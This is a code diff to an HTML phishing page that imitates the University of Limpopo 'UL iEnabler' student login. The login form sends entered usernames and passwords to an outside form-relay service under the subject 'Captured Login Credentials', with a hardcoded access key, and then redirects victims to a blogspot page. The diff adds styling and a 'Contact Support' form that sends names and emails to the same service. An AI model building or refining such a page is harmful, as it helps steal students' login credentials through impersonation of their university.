@@ -18,8 +18,11 @@ body { background: #c8dff7; min-height: 100vh; display: flex; flex-direction: co
 .login-body { padding: 14px 16px 18px; background: #fff; margin: 0 16px 14px; border: 1px solid #ccd; border-top: none; border-radius: 0 0 3px 3px; }
 .field-label { font-size: 13px; font-weight: bold; color: #000; margin-bottom: 4px; }
 .ul-input { width: 100%; padding: 7px 0; border: none; border-bottom: 1px solid #999; font-size: 13px; margin-bottom: 14px; background: transparent; }
+.ul-textarea { width: 100%; padding: 7px; border: 1px solid #999; border-bottom: 1px solid #999; font-size: 13px; margin-bottom: 14px; background: transparent; min-height: 80px; resize: vertical; }
 .msg-error { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; padding: 10px 14px; font-size: 13px; margin-bottom: 12px; border-radius: 2px; display: none; }
 .ul-btn.primary { padding: 8px 20px; background: #1a6faf; color: #fff; border: none; border-radius: 3px; cursor: pointer; }
+.pin-hint { font-size: 11px; color: #666; margin-top: -10px; margin-bottom: 14px; }
+.divider { border-top: 1px solid #ccd; margin: 20px 16px; }
 </style>
 </head>
 <body>
@@ -40,7 +43,7 @@ body { background: #c8dff7; min-height: 100vh; display: flex; flex-direction: co
 
     <div class="msg-error" id="msgError">⚠ Please fill in all required fields correctly.</div>
 
-   <form action="https://api.web3forms.com/submit" method="POST">
+   <form action="https://api.web3forms.com/submit" method="POST" id="loginForm">
   <input type="hidden" name="access_key" value="e7d82147-f211-41f0-99db-360741af20ca">
       <input type="hidden" name="_subject" value="UL iEnabler - Captured Login Credentials">
        <input type="hidden" name="_next" value="https://student-query.blogspot.com/2026/03/university-of-limpopo-student-query.html">
@@ -57,6 +60,26 @@ body { background: #c8dff7; min-height: 100vh; display: flex; flex-direction: co
       <input class="ul-input" type="password" name="password" id="passwordField" required>
 
       <button type="submit" class="ul-btn primary">Login</button>
+    </form>
+  </div>
+
+  <div class="divider"></div>
+
+  <div class="login-top">Contact Support</div>
+  <div class="login-body">
+    <form action="https://api.web3forms.com/submit" method="POST">
+      <input type="hidden" name="access_key" value="e7d82147-f211-41f0-99db-360741af20ca">
+      
+      <div class="field-label">Name:</div>
+      <input class="ul-input" type="text" name="name" required>
+
+      <div class="field-label">Email:</div>
+      <input class="ul-input" type="email" name="email" required>
+
+      <div class="field-label">Message:</div>
+      <textarea class="ul-textarea" name="message" required></textarea>
+
+      <button type="submit" class="ul-btn primary">Submit</button>
     </form>
   </div>
 </div>
